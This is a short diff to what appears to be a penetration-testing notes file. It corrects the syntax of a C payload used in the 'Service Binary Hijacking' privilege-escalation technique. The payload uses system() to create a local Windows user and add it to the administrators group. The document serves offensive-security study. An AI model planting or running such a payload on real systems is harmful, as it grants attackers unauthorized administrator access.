@@ -4106,7 +4106,7 @@ Also called "Service Binary Hijacking". Exploit insecure file permissions on ser
    #include <stdlib.h>
    int main () {
      int i;
-     i = system ("net user /add [username] [password]");
+     i = system ("net user [username] [password] /add");
      i = system ("net localgroup administrators [username] /add");
      return 0;
    }
